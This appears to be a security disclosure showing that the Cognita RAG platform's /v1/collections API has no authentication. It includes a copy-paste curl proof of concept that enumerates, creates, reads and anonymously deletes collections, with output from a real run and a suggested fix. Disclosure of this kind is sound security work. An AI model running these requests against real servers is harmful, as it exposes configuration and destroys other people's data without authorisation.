# Cognita collections API: unauthenticated full lifecycle (list/create/read config/delete)

**Verification: DYNAMICALLY-REPRODUCED** (full chain over real HTTP against a live Cognita server; output below is from the actual run)

## Reproduction conditions

- Cognita source snapshot (backend FastAPI app, `uvicorn backend.server.app:app`), Python 3.12, WSL2 Ubuntu 24.04
- PostgreSQL (prisma metadata store) + Qdrant (vector db) via docker, per the project's own `docker-compose.yaml` services
- Cognita ships **no authentication on any `/v1/*` endpoint** — the attacker is anyone who can reach the server port (the documented deployment exposes the API to frontend/teammates)

## Description

All collection-lifecycle routes in `backend/server/routers/collection.py` (GET/POST/DELETE `/v1/collections`, `/associate_data_source`, `/ingest`) have **no authentication and no authorization checks** — there is no auth dependency anywhere in the router. Any network client can enumerate collections with their full configuration (including embedder config and associated data-source FQNs/URIs), create collections, and delete any existing collection.

## Impact

An unauthenticated client can (1) disclose every collection's configuration and associated data sources, and (2) **destroy any collection** with a single DELETE — integrity/availability attack against the RAG platform's data.

## PoC (copy-paste ready)

```bash
# no credentials anywhere

# 1. list all collections with full configs
curl http://<cognita>:8000/v1/collections

# 2. create a victim collection (body: name + embedder_config)
curl -X POST http://<cognita>:8000/v1/collections \
  -H "Content-Type: application/json" \
  -d '{"name":"victim-collection","description":"legit user data",
       "embedder_config":{"name":"local-infinity/mixedbread-ai/mxbai-embed-large-v1","parameters":{}},
       "associated_data_sources":[]}'

# 3. read its full config anonymously
curl http://<cognita>:8000/v1/collections/victim-collection

# 4. destroy it anonymously
curl -X DELETE http://<cognita>:8000/v1/collections/victim-collection
curl -s -o /dev/null -w "%{http_code}\n" http://<cognita>:8000/v1/collections/victim-collection   # -> 404
```

## Execution result (actual run)

```
GET  /v1/collections          -> 200 {"collections":[]}
POST create victim-collection -> 201
GET  victim-collection        -> 200
     config disclosed: {"collection": {"name": "victim-collection", "description": "legit user data",
                   "embedder_config": {"name": "local-infinity/mixedbread-ai/mxbai-embed-large-v1", ...
DELETE victim-collection      -> 200 {"deleted":true}
GET  after delete             -> 404 (404 = destroyed by anonymous request)
```

## Suggested fix

Introduce an authentication/authorization layer on the `/v1/*` API (API key or per-user tokens), and make destructive operations require an owner/admin role.
